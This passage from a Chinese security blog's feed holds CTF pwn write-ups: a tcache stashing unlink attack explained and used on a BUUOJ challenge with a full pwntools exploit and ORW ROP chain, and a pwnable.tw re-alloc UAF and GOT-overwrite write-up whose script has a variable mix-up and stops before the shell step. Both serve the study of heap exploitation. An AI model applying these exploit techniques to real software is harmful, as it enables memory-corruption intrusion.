class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = last (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>其实发现一个很明显的地方，注意他把剩下的small_bin放入tcache的操作没有做任何的检查。</p><p>但是此处又有了矛盾的地方！</p><p><strong>首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态）</strong></p><p>然后，我们如果要在这里启动攻击，那么要求<code>SmallBin</code>中至少有两个Chunk(否则无法进入While中的if语句块)，<strong>同时要求Tcache处于非空状态。</strong></p><p>那样就产生了矛盾，导致这个漏洞看似无法利用。</p><p>但是<code>calloc</code>函数有一个很有趣的特性，它不会从<code>Tcache</code>拿<code>Chunk</code>，因此可以越过第一条矛盾“不能越过<code>Tcache</code>从<code>SmallBin</code>中取出<code>Chunk</code>”。</p><p>然后是<code>Unsorted Bin</code>的<strong><code>last remainder</code></strong>基址，当申请的Chunk大于<code>Unsorted Bin</code>中Chunk的大小且其为<code>Unsorted Bin</code>中的唯一<code>Chunk</code>时，该<code>Chunk</code>不会进入<code>Tcache</code>。</p><p>那么，再看这个图</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                        fd</span><br><span class="line">     |-----------------------------------------|</span><br><span class="line">     ↓        fd                  fd           |</span><br><span class="line">|--------|---------&gt;|---------|---------&gt;|----------|</span><br><span class="line">|smallbin|          |  chunk1 |          |  chunk2  | </span><br><span class="line">|--------|&lt;---------|---------|&lt;---------|----------|</span><br><span class="line">     |         bk                   bk        ↑</span><br><span class="line">     |                                        | </span><br><span class="line">     |----------------------------------------|</span><br><span class="line">     bk</span><br></pre></td></tr></table></figure><p>如果我们把chunk1的bk改掉，fd不变</p><p>fd不变就可以绕过第一个完整链的检查,并且可以通过解链操作向fake_chunk+0x10的位置写入一个很大的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。</p><h3 id="0x03-例题-BUUOJ-2020-新春红包题-3"><a href="#0x03-例题-BUUOJ-2020-新春红包题-3" class="headerlink" title="0x03 例题 BUUOJ-2020 新春红包题-3"></a>0x03 例题 BUUOJ-2020 新春红包题-3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size_choice, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input the red packet idx: '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)</span><br><span class="line">    sh.sendline(str(size_choice))</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input content: '</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 首先用calloc add delte同时操作，泄露出heap和libc基址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">4</span>, <span class="string">'a\n'</span>)</span><br><span class="line">    remove(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">heapbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x26c0</span></span><br><span class="line">log.success(<span class="string">'heapbase: '</span> + hex(heapbase))</span><br><span class="line"><span class="comment"># 在这里把对应大小(0x100)的tcache准备好（5个），虽然我这里写了6个，但其实要想任意地址分配的话是5个，不过我这里无所谓</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>,<span class="number">13</span>):</span><br><span class="line">    add(i, <span class="number">2</span>, <span class="string">'a\n'</span>)</span><br><span class="line">    remove(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>, <span class="number">4</span>, <span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">1</span>, <span class="string">'b\n'</span>)</span><br><span class="line">remove(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">libcbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))- <span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">'libcbase: '</span> + hex(libcbase)) </span><br><span class="line"><span class="comment"># 然后利用last_reminder的性质，如果malloc一个比它大的，就会把这个加入到smallbin种，构造出两个smallbin</span></span><br><span class="line">add(<span class="number">15</span>, <span class="number">3</span>, <span class="string">'c\n'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">16</span>, <span class="number">3</span>, <span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">3</span>, <span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heapbase + <span class="number">0x37e0</span>) + p64(heapbase+<span class="number">0x250</span>+<span class="number">0x10</span>+<span class="number">0x800</span><span class="number">-0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x300</span>+p64(<span class="number">0</span>) +p64(<span class="number">0x101</span>) +payload)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libcbase + <span class="number">0x000000000002155f</span></span><br><span class="line">pop_rdx_rsi_ret = libcbase + <span class="number">0x00000000001306d9</span></span><br><span class="line"></span><br><span class="line">open_addr = libcbase + <span class="number">0x10fc40</span></span><br><span class="line">read_addr = libcbase + <span class="number">0x110070</span></span><br><span class="line">write_addr = libcbase + <span class="number">0x110140</span></span><br><span class="line">leave_ret = libcbase + <span class="number">0x0000000000054803</span></span><br><span class="line"></span><br><span class="line">flag_addr = heapbase+<span class="number">0x37f0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'./flag\x00\x00'</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line">payload += p64(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后利用后门函数有个栈溢出，因为开了沙箱逃逸，因此orw即可</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'input: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'666'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + p64(flag_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'What do you want to say?'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这种利用方法类似于house of lore,总结一下，留个模板以后备用&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="wood1314.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="tcache" scheme="wood1314.github.io/tags/tcache/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw re-alloc</title>
    <link href="wood1314.github.io/year/07/29/ckur473eg0031ab15qwhqnp1z/"/>
    <id>wood1314.github.io/year/07/29/ckur473eg0031ab15qwhqnp1z/</id>
    <published>2020-07-29T12:47:27.000Z</published>
    <updated>2020-07-30T00:33:28.629Z</updated>
    
    <content type="html"><![CDATA[<p>以前做过realloc相关的利用，不过这题让我学到了realloc利用的新姿势</p><a id="more"></a><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目提供了四个功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. alloc</span><br><span class="line">2. realloc</span><br><span class="line">3. free</span><br><span class="line">4. exit</span><br></pre></td></tr></table></figure><p>其中alloc功能相当于malloc一个指定大小的块，不过大小限定在了0x78以内，realloc功能就是使用realloc函数重新分配空间，如果成功返回了一个地址，那么就把这个地址复制到bss段上。这里存在一个off by null，如果这个题没有两个堆块这个数量限制的话还可以搞堆重叠，但是只有两个chunk的话就很难利用。</p><p>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。</p><p>free功能就是同时free掉chunk以及将heap数组中的指针清0</p><h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><h3 id="libc2-29-相关"><a href="#libc2-29-相关" class="headerlink" title="libc2.29 相关"></a>libc2.29 相关</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>libc2.29中多出了一个结构叫做<code>key</code>，它会把<code>tcache</code>结构的头部保存在key中,然后在空闲<code>chunk</code>加入<code>tcache</code>链后从<code>key</code>开始遍历<code>tcache</code>中的<code>chunk</code>，看看有没有重复的，有则会出现<code>double free</code>的报错</p><p>检测代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache)) <span class="comment">// 检查是否为tcache_perthread_struct地址</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">     tmp;</span><br><span class="line">     tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)                      <span class="comment">// 检查tcache中是否有一样的chunk</span></span><br><span class="line">    malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>简单总结一下，2.29下tcache触发double free报错的条件为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx]</span><br></pre></td></tr></table></figure><h3 id="realloc-ptr-size-函数"><a href="#realloc-ptr-size-函数" class="headerlink" title="realloc(ptr, size)函数"></a>realloc(ptr, size)函数</h3><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p><ol><li><code>ptr == 0</code>: malloc(size)</li><li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li><li><code>ptr != 0 &amp;&amp; size == old_size</code>: edit(ptr)</li><li><code>ptr != 0 &amp;&amp; size &lt; old_size</code>: edit(ptr) and free(remainder)</li><li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;</li></ol><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>利用uaf在不同的tcache链上放置atoll_got的chunk</li><li>利用其中一个指向atoll_got的chunk，把atoll_got改为printf，利用格式化字符串漏洞泄露libc</li><li>最后再利用另一个指向atoll_got的chunk，将其改为system，最后调用system(‘/bin/sh’)拿到shell</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sh = process('./re-alloc')</span><br><span class="line">elf = ELF('./re-alloc')</span><br><span class="line">libc = ELF('./libc.so')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">alloc</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    sh.recvuntil('Your choice: ')</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil('Index:')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('Size:')</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil('Data:')</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">realloc</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    sh.recvuntil('Your choice: ')</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil('Index:')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('Size:')</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    if content == '':</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.recvuntil('Data:')</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">rfree</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil('Your choice: ')</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil('Index:')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">bss = elf.bss(<span class="number">0</span>)</span><br><span class="line">atoll_got = elf.got[<span class="string">"atoll"</span>]</span><br><span class="line">atoll_plt = elf.plt[<span class="string">"atoll"</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">"printf"</span>]</span><br><span class="line">libc_start_main_ret_offset = libc.symbols[<span class="string">"__libc_start_main"</span>] + <span class="number">0xeb</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># let tcache[<span class="number">0x20</span>] =&gt; atoll_got</span><br><span class="line"># heap[<span class="number">0</span>] ==&gt; chunk(<span class="number">0x18</span>) &lt;== heap[<span class="number">1</span>]</span><br><span class="line">alloc(0, 0x18, 'aaa\n')           #malloc</span><br><span class="line">realloc(0, 0, '')                 #free</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))  <span class="meta">#edit</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBB"</span>)    </span><br><span class="line"><span class="meta"># now heap[0] == heap[1] == NULL</span></span><br><span class="line">realloc(0, 0x38, 'aaa\n')</span><br><span class="line">rfree(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">rfree(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># let tcache[0x50] =&gt; atoll_got</span></span><br><span class="line"><span class="meta"># heap[0] ==&gt; chunk(0x18) &lt;== heap[1]</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">realloc(0,0,'')</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">0</span>, <span class="number">0x48</span>, p64(atoll_got))</span><br><span class="line">alloc(1, 0x48, 'BBB')</span><br><span class="line"></span><br><span class="line"><span class="meta"># now heap[0] == heap[1] == NULL</span></span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"CCC"</span>)</span><br><span class="line">rfree(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">rfree(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># above all, we get two tcache point to atoll_got that can be malloc</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># alloc once at heap[0]</span></span><br><span class="line"><span class="meta"># change the atoll_got to printf_plt</span></span><br><span class="line"><span class="meta"># use format string bug to leak the __libc_start_main_ret in the stack</span></span><br><span class="line">gdb.attach(sh,'b*0x40129D')</span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, p64(printf_plt))</span><br><span class="line">sh.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"%21$p"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_ret = <span class="keyword">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret - libc_start_main_ret_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>被free掉的chunk再用realloc进行相同size的操作居然可以达到uaf的效果，本以为会malloc出来的</li><li>把atoll函数改为printf真的强，这也提供了一个思路就是可以通过一个漏洞来构造另外的漏洞来达成利用的目的</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前做过realloc相关的利用，不过这题让我学到了realloc利用的新姿势&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
      <category term="tcache" scheme="wood1314.github.io/tags/tcache/"/>
    
      <category term="pwnable" scheme="wood1314.github.io/tags/pwnable/"/>
    
  </entry>
  
  <entry>
    <title>PE结构</title>
    <link href="wood1314.github.io/year/07/08/ckur473de000rab15shv2m7ap/"/>
    <id>wood1314.github.io/year/07/08/ckur473de000rab15shv2m7ap/</id>
    <published>2020-07-08T13:26:31.000Z</published>
    <updated>2020-07-08T14:34:27.587Z</updated>
    
